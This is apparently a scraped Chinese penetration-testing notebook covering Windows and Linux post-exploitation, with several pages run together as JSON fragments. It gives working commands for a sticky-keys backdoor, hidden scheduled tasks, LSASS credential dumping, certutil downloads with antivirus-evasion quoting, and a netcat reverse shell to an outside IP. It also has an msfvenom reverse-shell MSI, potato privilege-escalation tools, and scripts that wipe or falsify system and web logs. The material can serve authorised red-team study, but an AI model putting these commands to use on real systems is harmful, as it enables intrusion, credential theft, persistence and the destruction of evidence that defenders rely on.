我们可以通过删除其安全描述符（SD）使任务计划对系统中的任何用户不可见。 所有计划任务的安全描述符都存储在计算机\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\中名为“SD”的值 添加自启动项 启动项目录 # 特定用户登录时 C:\\Users\\\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup # 任意用户登录时 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp 注册表启动项 # 当前用户登录时 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce # 任意用户登录时 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce 新建一个值 RDP后门 拥有RDP权限，在对方锁屏并不知道密码时仍可以使用终端的方法 粘滞键 连续按下SHIFT5 次后，Windows 将执行C:\\Windows\\System32\\sethc.exe. 将sethc替换为cmd C:\\> takeown /f c:\\Windows\\System32\\sethc.exe SUCCESS: The file (or folder): \"c:\\Windows\\System32\\sethc.exe\" now owned by user \"PURECHAOS\\Administrator\". C:\\> icacls C:\\Windows\\System32\\sethc.exe /grant Administrator:F processed file: C:\\Windows\\System32\\sethc.exe Successfully processed 1 files; Failed processing 0 files C:\\> copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe Overwrite C:\\Windows\\System32\\sethc.exe? (Yes/No/All): yes 1 file(s) copied. 本机信息收集 # 网卡 ipconfig /all # 路由 route print # arp缓存 arp -a # 域，补丁，系统型号 systeminfo # 查看安装程序和版本信息 wmic product get name,version # 进程 tasklist Windows命令 dump内存 # 查看LsassPi # 命令行 procdump.exe -r -ma lsass.exe output_name # 默认保存到当前路径下的output_name.dmp sqldump.exe LsassPid 0 0x01100 # 图形界面 任务管理器-详细信息(detail)-右键转储-默认保存到C:\\Users\\xxx\\AppData\\Local\\Temp\\下 process explore-右键转储 文件操作 文件传输 原生命令 powershell -c \"(new-object System.Net.WebClient).DownloadFile('','')\" powershell (new-object System.Net.WebClient).DownloadFile('','') bitsadmin /transfer n certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php 绕过火绒下载文件，单词加双引号，中间可以插入任意数量的成对双引号 \"c\"\"e\"\"r\"\"t\"\"u\"\"t\"\"i\"\"l\" -\"u\"\"r\"\"l\"\"c\"\"a\"\"c\"\"h\"\"e\" -split -f https://url/1.exe 1.exe 小工具 echo y | pscp.exe -pw ssh密码 -P ssh端口 \"单个文件路径\" user@ip:保存路径 echo y | pscp.exe -pw ssh密码 -P ssh端口 -r \"目录路径\" user@ip:保存路径 文件/目录查找 # 列出所有文件 dir /b /s c:\\ > c.txt # 查找文件 dir c:\\ /s /b | find \"win.ini\" # 递归搜索E盘，后缀为exe，修改日期>=2023/12/16的文件 FORFILES /P E:\\ /S /M *.exe /C \"cmd /c echo @path\" /D +2023/12/16 > res.txt 文件写入 echo \"\" >> shell.php certutil编码文件 certutil -encode 1.txt output.txt certutil解码文件 certutil -decode output.txt input.txt powershell -c \"'文件内容' | Out-File input.txt -Append\" # 写入 powershell -c \"add-content 文件 -value \\\"文件内容\\\"\" # 去除换行 powershell \"-join((gc -LiteralPath \\\"文件\\\"))\" 解压缩 windows自带命令 单个文件 # 解压 expand -r file.zip extract_path # 压缩 makecab 1.txt 1.zip 多文件 # 假设现有文件夹test E:\\test\\文件1.txt E:\\test\\文件2.txt E:\\test\\abc\\文件3.txt #要压缩整个文件夹需要将test下所有文件列一个清单，比如E:\\list.txt： test\\文件1.txt test\\文件2.txt test\\abc\\文件3.txt # 执行压缩，最后生成一个cab文件，改后缀为zip即可，而且生成的zip内部文件全部在同一个文件夹下 makecab /f F:\\list.txt #解压（输出文件夹必须存在，否则不成功）： expand -F:* test.zip E:\\output\\ Rar64.exe 压缩文件夹（不包含子目录）： rar.exe a \"压缩包保存路径文件名\" \"被压缩的文件夹路径\" 压缩文件夹（包含子目录）： rar.exe a -r \"压缩包保存路径文件名\" \"被压缩的文件夹路径\" 压缩文件夹（以时间命名压缩包）： rar.exe a -ag -r -s -ibck \"压缩包保存路径（记得在最后加\\）\" \"被压缩的文件夹路径\" 7z.exe 7z a -mx -myx -mmt=off -ms=on -mtm=off -mtc=off -mta=off -mtr=off -m0=LZMA:d=384m:fb=273:lc=8 -mmc=1000000000 -- \"压缩包保存路径文件名\" \"Users\\*\" 防火墙操作 使用命令行管理 Windows 防火墙 - Windows Security | Microsoft Learn https://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/configure-with-command-line?tabs=cmd # 高版本系统 netsh advfirewall firewall netsh firewall # 低版本系统 netsh firewall # 查看防火墙规则 netsh firewall show config netsh firewall show state # 开启防火墙 netsh advfirewall set allprofiles state on # 关闭防火墙 netsh advfirewall set allprofiles state off 注册表操作 日志操作 Powershell命令 # 查看Powershell历史命令 type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt type %appdata%\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt 常用的系统变量 查看当前用户目录%HOMEPATH 查看当前目录%CD% 列出用户共享主目录的网络路径%HOMESHARE% 列出有效的当前登录会话的域名控制器名 列出了可执行文件的搜索路径%Path% 列出了处理器的芯片架构%PROCESSOR_ARCHITECTURE% 列出了Program Files文件夹的路径%ProgramFiles% 列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP% 列出了当前登录的用户可用应用程序的默认临时目录%TEMP% and %TMP% 列出了包含用户帐号的域的名字%USERDOMAIN% 列出操作系统目录的位置%WINDIR% 返回“所有用户”配置文件的位置%ALLUSERSPROFILE% 返回处理器数目%NUMBER_OF_PROCESSORS% powershell地址%PSModulePath% 计划任务 Windows Server 2012 以后的版本没有at命令，只有schtasks命令 RDP远程桌面 # 连接rdp win+r mstsc # 查询注册表，若字段值为0，则表示已启动RDP；若为1，则表示禁用RDP reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections # 开启远程桌面 reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f # 关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权） reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 # 设置防火墙策略放行3389端口 netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow DCOM组件执行命令 $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"IP\")) # 第三个参数Minimized用于隐藏cmd窗口 $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,\"/c \",\"Minimized\") Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-07-10 20:42:25 "},"02.后渗透/Windows域渗透/入侵痕迹清理.html":{"url":"02.后渗透/Windows域渗透/入侵痕迹清理.html","title":"入侵痕迹清理","keywords":"","body":" 转载自https://www.cnblogs.com/yokan/p/15701536.html 在攻击结束后，如何不留痕迹的清除日志和操作记录，以掩盖入侵踪迹，这其实是一个细致的技术活。在蓝队的溯源中，攻击者的攻击路径都将记录在日志中，所遗留的工具也会被蓝队进行分析，在工具中可以查找特征，红队自研工具更容易留下蛛丝马迹。你所做的每一个操作，都要被抹掉；你所上传的工具，都应该被安全地删掉，以防被溯源在演练中失分。 Windows入侵痕迹清理 Windows日志清除 Windows日志路径： 系统日志：%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx 安全日志：%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx 应用程序日志：%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx 日志在注册表的键：HKEY_LOCAL_MACHINE\\system\\CurrentControlSet\\Services\\Eventlog 常见的安全事件ID： windows 日志清除方式： （1）最简单粗暴的方式 开始→运行,输入 eventvwr 进入事件查看器，右边栏选择清除日志。 或者使用wevtutil wevtutil el 列出系统中所有日志名称 for /F \"tokens=*\" %a in ('wevtutil.exe el') DO wevtutil.exe cl \"%a\" 清除所有日志 wevtutil cl system 清理系统日志 wevtutil cl application 清理应用程序日志 wevtutil cl security 清理安全日志 （2）powershell一键清除Windows事件日志 PowerShell -Command \"& {Clear-Eventlog -Log Application,System,Security}\" 或 Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname} ⭐（3）利用脚本停止日志的记录 通过该脚本遍历事件日志服务进程（专用svchost.exe）的线程堆栈，并标识事件日志线程以杀死事件日志服务线程。 该脚本没有杀死进程，而是杀死了线程。因此，虽然事件日志服务似乎在系统中运行（因为没有终止进程），但它实际上并没有运行（因为终止了线程）并且系统不收集日志。 项目地址：hlldz/Phant0m: Windows Event Log Killer (github.com) 使用： 执行phant0m之后，尝试远程登录该服务器，并不会记录日志 ⭐（4）Windows单条日志清除 项目地址：QAX-A-Team/EventCleaner: A tool mainly to erase specified records from Windows event logs, with additional functionalities. (github.com) 该工具主要用于从Windows事件日志中删除指定的记录。同时也可以暂停日志线程,停止日志记录。 使用步骤： 1、EventCleaner closehandle #解除 security.evtx的文件占坑 2、EventCleaner 100 #删除 event record id 为 100 的日志 3、EventCleaner suspend #暂停日志线程,停止日志记录 4、do anything without worrying about logs 5、EventCleaner normal #恢复日志线程 6、delete EventCleaner （5）Windows日志伪造 使用eventcreate这个命令行工具来伪造日志或者使用自定义的大量垃圾信息覆盖现有日志。 eventcreate -l system -so administrator -t warning -d \"this is a test\" -id 500 IIS日志 IIS默认日志路径： %SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\ 清除WWW日志： 停止服务：net stop w3svc 删除日志目录下所有文件：del *.* 启用服务：net start w3svc 利用Windows自带命令进行安全擦除 （1）Shift+Delete快捷键永久删除 直接删除文件，还是能在回收站找到的，使用Shift+Delete快捷键可以直接永久删除了。 可以用数据恢复软件，删除的文件尽快恢复，否则新的文件存入覆盖了原来的文件痕迹就很难恢复了。 （2）Cipher 命令多次覆写 在删除文件后，可以利用Cipher 命令通过 /W 参数可反复写入其他数据覆盖已删除文件的硬盘空间，彻底删除数据防止被恢复。 比如，删除D:\\tools目录下的文件，然后执行这条命令： cipher /w:D:\\tools 这样一来，D 盘上未使用空间就会被覆盖三次：一次 0x00、一次 0xFF，一次随机数，所有被删除的文件就都不可能被恢复了。 （3）Format命令覆盖格式化 Format 命令加上 /P 参数后，就会把每个扇区先清零，再用随机数覆盖。而且可以覆盖多次。比如： format D: /P:8 这条命令表示把 D 盘用随机数覆盖 8 次。 清除远程桌面连接记录 当通过本机远程连接其他客户端或服务器后，会在本机存留远程桌面连接记录。代码保存为clear.bat文件，双击运行即可自动化清除远程桌面连接记录。 @echo off reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" cd %userprofile%\\documents\\ attrib Default.rdp -s -h del Default.rdp Metasploit 痕迹清除 （1）查看事件日志 meterpreter > run event_manager -i [*] Retriving Event Log Configuration Event Logs on System ==================== Name Retention Maximum Size Records ---- --------- ------------ ------- Application Disabled 20971520K 2149 HardwareEvents Disabled 20971520K 0 Internet Explorer Disabled K 0 Key Management Service Disabled 20971520K 0 Security Disabled 20971520K 1726 System Disabled 20971520K 3555 Windows PowerShell Disabled 15728640K 138 （2）清除事件日志（包括六种日志类型） meterpreter > run event_manager -c （3）另外，也可以输入clearv命令清除目标系统的事件日志（仅包含三种日志类型） meterpreter > clearev [*] Wiping 4 records from Application... [*] Wiping 8 records from System... [*] Wiping 7 records from Security... 清除recent 在文件资源管理器中点击“查看”->“选项”->在常规->隐私中点击”清除”按钮 或直接打开C:\\Users\\Administrator\\Recent并删除所有内容 或在命令行中输入del /f /s /q “%userprofile%\\Recent*.* Linux入侵痕迹清理 （ #管理员 $普通用户 / 表示 根目录 ~表示当前用户家目录） 清除history历史命令记录 查看历史操作命令： history history显示内存和~/.bash_history中的所有内容； 内存中的内容并没有立刻写入~/.bash_history，只有当当前shell关闭时才会将内存内容写入shell （1）编辑history记录文件，删除部分不想被保存的历史命令。 vim ~/.bash_history （2）清除当前用户的history命令记录⭐ history -c # 删除内存中的所有命令历史 history -r # 删除当前会话历史记录 （3）利用vim特性删除历史命令 #使用vim打开一个文件vi test.txt# 设置vim不记录命令，Vim会将命令历史记录，保存在viminfo文件中。:set history=0# 用vim的分屏功能打开命令记录文件.bash_history，编辑文件删除历史操作命令：vsp ~/.bash_history# 清楚保存.bash_history文件即可。 （4）在vim中执行自己不想让别人看到的命令 :set history=0 :!command ⭐不记录history历史命令 （1）通过修改配置文件/etc/profile，使系统不再保存命令记录。 HISTSIZE=0 （2）登录后执行下面命令,不记录历史命令(.bash_history) unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 清除系统日志痕迹 Linux 系统存在多种日志文件，来记录系统运行过程中产生的日志。 /var/run/utmp 记录现在登入的用户，使用w,who,users等命令查看 /var/log/wtmp 记录用户所有的登入和登出，使用last命令查看 /var/log/lastlog 记录每一个用户最后登入时间，使用lastlog命令查看 /var/log/btmp 记录所有登录失败信息，使用lastb命令查看 /var/log/auth.log 需要身份确认的操作 /var/log/secure 记录安全相关的日志信息 /var/log/maillog 记录邮件相关的日志信息 /var/log/message 记录系统启动后的信息和错误日志 /var/log/cron 记录定时任务相关的日志信息 /var/log/spooler 记录UUCP和news设备相关的日志信息 /var/log/boot.log 记录守护进程启动和停止相关的日志消息 （1）清空日志文件 以下几种方式： cat /dev/null > filename echo \"\" > filename echo > filename : > filename > filename ⭐（2）替换/删除部分日志 日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。 替换： # 192.168.100.101为攻击者IP，10.0.0.55为伪造IP，-i编辑文件 sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/btmp* sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/lastlog sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/wtmp sed 's/192.168.100.101/10.0.0.55/g' -i secure sed 's/192.168.100.101/10.0.0.55/g' -i /var/log/utmp 删除： # 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip sed -i '/自己的ip/'d /var/log/messages sed -i '/当天日期/'d filename 一键清除history和系统日志脚本 #!/usr/bin/bash echo > /var/log/syslog echo > /var/log/messages echo > /var/log/httpd/access_log echo > /var/log/httpd/error_log echo > /var/log/xferlog echo > /var/log/secure echo > /var/log/auth.log echo > /var/log/user.log echo > /var/log/wtmp echo > /var/log/lastlog echo > /var/log/btmp echo > /var/run/utmp rm ~/./bash_history history -c 清除web日志痕迹 web日志同样可以使用sed进行伪造，例如apache日志、MySQL日志、php日志 sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/apache/access.log sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/apache/error_log sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/mysql/mysql_error.log sed 's/192.168.100.101/10.0.0.55/g' –i /var/log/mysql/mysql_slow.log sed 's/192.168.100.101/192.168.1.4/g' –i /var/log/apache/php_error.log 清除部分相关日志： # 使用grep -v来把我们的相关信息删除 cat /var/log/nginx/access.log | grep -v evil.php > tmp.log # 把修改过的日志覆盖到原日志文件 cat tmp.log > /var/log/nginx/access.log/ 参考 https://cloud.tencent.com/developer/article/1698537 https://www.freebuf.com/articles/system/266458.html https://www.cnblogs.com/xiaozi/p/13648156.html Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-10-27 17:07:10 "},"02.后渗透/Windows域渗透/后渗透之了解.html":{"url":"02.后渗透/Windows域渗透/后渗透之了解.html","title":"后渗透之了解","keywords":"","body":"目标 内网渗透测试的目标一般是获取特定机器的权限或者特定用户，进而获得特定的资源，对内网的安全性进行评估。 本机信息收集 本机信息包括OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。 判断是否存在域 获得本机相关信息之后，就要判断当前内网中是否存在域。如果当前内网存在域，则需要判断所控主机是否在域内。 域内基础信息收集 主机 用户和用户组 计算机列表 密码策略 域控 域管理员 域管理进程 核心业务机器 敏感文件 域内网段划分情况及拓扑结构 构建隧道 判断内网连通性构建相应隧道 端口转发 遵循三个原则 稳定性（主要用于扫描）{ 支持高并发、自动断线重连 } 安全性（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 } 健壮性 { 支持多种协议方式、最好支持插件定制 } 探测域内存活主机 在进行域内存活主机探测的时候，有几个注意点： 尽量避免触发域内的一些防病毒软件的告警和拦截； 在非授权情况下，避免使用工具进行暴力扫描； 尽量避免在目标机子上使用图形化工具； 尽量使用系统自带的工具进行探测，如powershell脚本； 域内存活主机端口扫描 一般端口扫描需要关注如下三点： 端口的Banner信息； 端口上运行的服务； 常见服务的默认端口号； 横向移动 → 拿下域控 为什么要拿下域控呢？ 活动目录是一种基于Windows的目录服务，用于存储并向内部网络环境提供数据对象。它允许集中管理身份验证和授权。 AD包含有关网络和环境的基本信息，包括用户、计算机、打印机等。例如，AD 可能包含用户的详细信息，如职位、电话号码、地址、密码、组、权限等。 而要想实现域环境，就必须要计算机中安装活动目录。 如果说在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。 Web手段 常见Web，主机漏洞 集权系统： exchange vencenter 密码喷洒 各种收集到的凭证+密码喷洒 域内手法 协议攻击 NTLM协议 Kerberos协议 辅助 免杀 绕过防护软件比如AV，IDS，IPS，EDR 权限提升 很多操作都需要高权限才能做 权限维持和痕迹清理 攻击过程不是一蹴而就的，需要防止在攻击过程中被发现和查杀，导致攻击失败 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-28 15:28:12 "},"02.后渗透/Windows域渗透/后渗透之基础知识.html":{"url":"02.后渗透/Windows域渗透/后渗透之基础知识.html","title":"后渗透之基础知识","keywords":"","body":"工作组与域 工作组,域,域控是什么及它们之间的一些关系 | APT404-不作恶 工作组就是把一些具有相同职能(比如,可以按部门,按房间号,按岗位,按操作系统类型等的不同进行分组管理)的机器都放到一个组里。 实际上工作组只是形式上的把大家放在了一起而已,并不存在真正的集中管理作用,工作组内的每台机器依然是相互独立,互不干涉,各自为政的。如果要访问工作组中其他主机的资源，需要提供该主机的账号密码。 域，通过域管理员管理域控（DC）来对域内主机进行管理，要想访问域内主机资源，就要成为域内用户，并受限于身份。 域管理员可以任意操作域内的任意一台主机（当主机加入域中时，域控就会向该主机的本地管理组中加入域管理员账户） 域控服务器上的用户默认为域用户 AD（ Active Directory ）：保存域用户身份凭证 Windows身份认证机制 域渗透学习（一）Windows认证机制 | AresX's Blog 本地认证 指用户直接操作计算机登陆账户 本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对。我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的 网络认证netNTLM 挑战响应机制 域认证--Kerberos协议 域渗透学习（二）Kerberos协议 | AresX's Blog 参与认证的三个角色的NTLM Hash是三个密钥，这三个NTLM Hash的唯一作用是确保会话密钥Sessionkey的安全传输 验证身份 收到两个消息，都是先用自己的NTLM哈希进行解密，得到会话密钥和cilent id，时间戳，再用会话密钥对另一个消息进行解密，得到另一组cilent id和时间戳，将解密得到的这两组cilent id和时间戳进行比较，如果相同，则验证成功。 黄金票据TGT(Ticket Granting Ticket) 用于身份认证，存储在内存，默认有效期为10小时 内容为Client/TGS Sessionkey和cilent id，时间戳，由KDC中的AS用KDC密钥（即TGS密钥/KDC服务器krbtgt用户的NTLM Hash）加密得到 （向KDC请求身份认证，所以用KDC密钥加密） 白银票据TGS(Ticket Granting Server) 内容为Client/Server Sessionkey和cilent id，时间戳,由KDC中的TGS用Server密钥(服务器的NTLMHASH)加密得到 （向Server请求服务，所以用Server密钥加密） 二者区别 黄金票据，获取KDC用户（krbtg用户的hash值）就可以伪造任意用户的黄金票据从而实现对域内任意机器的一个访问。 白银票据，当获取到域内机器用户的hash值就可以伪造一个真正的白银票据。实现对某个机器特定服务的访问。 他们两个区别就在黄金票据作用更大获得TGT票据后可以访问任意机器任意服务，白银只能指定机器指定服务。 mimikatz 原理 本地认证中用来处理用户输入密码的进程即lsass.exe,密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行比对 我们使用mimikatz来获取的明文密码，便是在这个进程中读取到的 使用注意事项 需要高权限，可以先用privailge模块提权 补丁 安装了KB2871997补丁或者系统版本大于windows server 2012时，lsass.exe不保存明文密码不保存明文的密码。 绕过 # 启用Wdigest Auth，内存中还是会保存系统的明文口令 将下列注册表路径的 HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest 以下项的 UseLogonCredential 值修改成0或1 0：关闭Wdigest Auth 1：启动Wdigest Auth Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 23:04:03 "},"02.后渗透/Windows域渗透/后渗透之权限提升.html":{"url":"02.后渗透/Windows域渗透/后渗透之权限提升.html","title":"后渗透之权限提升","keywords":"","body":"提权的本质 利用权限配置的失误 数据库提权 需要服务器开启数据库服务及获取到最高权限用户密码。 除 Access 数据库外，其他数据库基本都存在数据库提权的可能。 MYSQL 国光师傅总结 UDF提权只能获得mysql的运行权限，对于linux系统，默认给mysql分配一个\"mysql:mysql\"用户，所以对于linux系统来说这个给提权没啥意义。 Windows提权 前置知识 Windows的权限（用户、组和访问控制）_ 目的 从 Webshell、数据库权—> 系统普通用户权限—>Administrator 权限—>System 权限 手法 系统配置错误 工具 mertdas/PrivKit: PrivKit is a simple beacon object file that detects privilege escalation vulnerabilities caused by misconfigurations on Windows OS. (github.com) 检查清单 Checks for Unquoted Service Paths Checks for Autologon Registry Keys Checks for Always Install Elevated Registry Keys Checks for Modifiable Autoruns Checks for Hijackable Paths Enumerates Credentials From Credential Manager Looks for current Token Privileges 该工具为CS的插件，导入后在beacon中使用 beacon> privcheck 可信任服务路径漏洞 路径没有包含在引号中，服务会按照以下顺序依次执行 c:\\program.exe c:\\program files.exe c:\\program files (x86)\\grasssoft\\macro.exe c:\\program files (x86)\\grasssoft\\macro expert\\MacroService.exe 可以看到 Windows 尝试执行了四次才找到真正的程序。 由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。 即我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的服务重启时，系统就会执行我们的木马程序。 可以使用以下命令查看系统中错误配置的路径 wmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\" 配置文件 # 自动安装配置文件 C:\\Unattend.xml C:\\Windows\\Panther\\Unattend.xml C:\\Windows\\Panther\\Unattend\\Unattend.xml C:\\Windows\\system32\\sysprep.inf C:\\Windows\\system32\\sysprep\\sysprep.xml # IIS配置文件 C:\\inetpub\\wwwroot\\web.config C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config # 搜索凭证 type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionString PuTTY是Windows系统上常见的SSH客户端。用户不必每次都指定连接的参数，而是可以将会话存储在IP、用户和其他配置可以存储的地方，以供以后使用。虽然PuTTY不允许用户存储他们的SSH密码，但它会存储包括明文身份验证凭据的代理配置。 要检索存储的代理凭证，您可以使用以下命令在以下注册表项下搜索ProxyPassword: reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\ /f \"Proxy\" /s 注意:Simon Tatham是PuTTY的创建者(他的名字是路径的一部分)，而不是我们正在检索密码的用户名。运行上述命令后，存储的代理用户名也应该是可见的。 就像putty存储凭据一样，任何存储密码的软件，包括浏览器、电子邮件客户端、FTP客户端、SSH客户端、VNC软件等，都有恢复用户保存的任何密码的方法。 定时任务 # 查询定时任务 schtasks /query # 查看权限 icacls # 写入 echo c:\\tools\\nc64.exe -e cmd.exe 10.17.16.148 1234 > C:\\tasks\\schtask.bat 恶意msi安装程序 前置条件 reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer msf生成恶意msi msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.63.3 LPORT=LOCAL_PORT -f msi -o malicious.msi 受害机执行 msiexec /quiet /qn /i C:\\Windows\\Temp\\malicious.msi 或者使用exploit/windows/local/always_install_elevated模块 历史命令 cmd type %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt powershell type $Env:userprofile\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Saved Windows Credentials cmdkey /list runas /savecred /user:admin cmd.exe 以这个用户权限开启一个新的cmd Bypass UAC 工具hfiref0x/UACME: Defeating Windows User Account Control (github.com) 令牌窃取 工具BeichenDream/SharpToken: Windows Token Stealing Expert (github.com) 在红队横向移动期间，我们经常需要窃取其他用户的权限。在现代EDR的防御下，我们很难使用Mimikatz来获取其他用户权限，如果目标用户没有进程存活，我们也没有办法使用“OpenProcessToken”来窃取Token。 SharpToken是一个利用Token泄漏的工具。它可以从系统中的所有进程中找到泄漏的令牌并使用它们。如果您是低权限的服务用户，甚至可以使用它来升级到“NT AUTHORITY\\SYSTEM”权限，并且可以切换到目标用户的桌面... 内核提权 查找补丁情况来选择CVE打 土豆系列 烂土豆（Rotten Potato） 烂土豆不适用于 >= Windows 10 1809 和 Windows Server 2019 的版本 https://github.com/foxglovesec/RottenPotato 烂土豆配合MSF提权 使用令牌窃取进行提权 use incognito （进入incognito模块） 通过MSF执行烂土豆 execute -cH -f RottenPotato.exe list_tokens -u （列出令牌） impersonate_token \"NT AUTHORITY\\\\SYSTEM\" 烂土豆NG（Rotten PotatoNG） https://github.com/antonioCoco/JuicyPotatoNG JuicyPotatoNG.exe -t * -p \"c:\\Windows\\System32\\cmd.exe\" -a \"/c whaomi > .\\1.txt\" 强制参数:-t createprocess call: CreateProcessWithTokenW， CreateProcessAsUser， 同时尝试 -p :要启动的程序可选参数 -1 : COM服务器监听端口(默认为10247) -a :传递给程序的命令行参数(默认为NULL) -c :(默认值{854A20FB-2D44-457D-992F-EF13785D2B51}) -i:交互式控制台(仅对CreateProcessAsUser有效)额外的模式 -b:暴力破解所有clsid。alert:仅用于测试。大约会产生1000个进程! -s:寻找没有被Windows Defender防火墙过滤的合适COM端口 多汁土豆（Juicy Potato） https://github.com/ohpe/juicy-potato http://ohpe.it/juicy-potato/CLSID/ 多汁土豆适用于多汁土豆NG（Juicy PotatoNG） https://github.com/antonioCoco/JuicyPotatoNG JuicyPotatoNG.exe -t * -p \"C:\\windows\\system32\\cmd.exe\" -a \"/c whoami > C:\\JuicyPotatoNG.txt\" RasmanPotato Windows 10(11未测试)，Windows Server 2012 - 2019(2022未测试) magicRasMan v0.1 Provided that the current user has the SeImpersonate privilege, this tool will have an escalation to SYSTEM Arguments: -c Execute the command *CMD* -m Choose The RPC Function [1]VpnProtEngWinRtConnect [2]VpnProtEngGetInterface -i Interact with the new process in the current command prompt (default is non-interactive) DCOMPotato https://github.com/zcgonvh/DCOMPotato LocalPotato（CVE-2023-21746） https://github.com/decoder-it/LocalPotato Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-01-02 15:54:09 "},"02.后渗透/Windows域渗透/后渗透之权限维持.html":{"url":"02.后渗透/Windows域渗透/后渗透之权限维持.html","title":"后渗透之权限维持","keywords":"","body":"权限维持的目的 当获取到服务器的控制权后，为了防止服务器管理员发现和修补漏洞导致对服务器权限的丢失，测试人员往往需要一些手段（后门）来实现对目标服务器的持久化访问。 持久化访问（Persistence，权限维持）技术就是包括任何可以被测试人员用来在系统重启、更改用户凭据或其他可能造成访问中断的情况发生时保持对系统的访问技术。 免杀 Webshell java免杀合集 - 跳跳糖 (tttang.com) 什么？你还不会webshell免杀？（一） (qq.com) 浅谈JspWebshell之编码 - 跳跳糖 (tttang.com) 木马 Linux权限维持 https://github.com/RuoJi6/HackerPermKeeper Windows权限维持 Windows权限维持总结 - 先知社区 (aliyun.com) 参考文章 拓展：blogs/持久控制/Linux at master · aplyc1a/blogs (github.com) 02.Linux权限维持 · d4m1ts 知识库 (gm7.org) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 23:04:31 "},"02.后渗透/社会工程学/近源/BadUsb.html":{"url":"02.后渗透/社会工程学/近源/BadUsb.html","title":"近源渗透之BadUSB","keywords":"","body":"原理 诞生 在2014年的BlackHat大会上，信息安全专家展示了一种新的网络安全威胁，这种技术被称为BadUSB，实际上是HID攻击，该漏洞由Karsten Nohl和Jakob Lell共同发现。 HID HID是\"Human Interface Device\"的缩写，中文意为\"人机接口设备\"。HID是一种用于计算机和其他电子设备之间进行交互的标准化协议和接口。HID包括多种输入和输出设备，例如键盘、鼠标、游戏手柄、触摸屏、扫描仪等。这些设备通过HID协议与计算机通信，使用户能够通过这些设备与计算机进行交互操作。 HID攻击 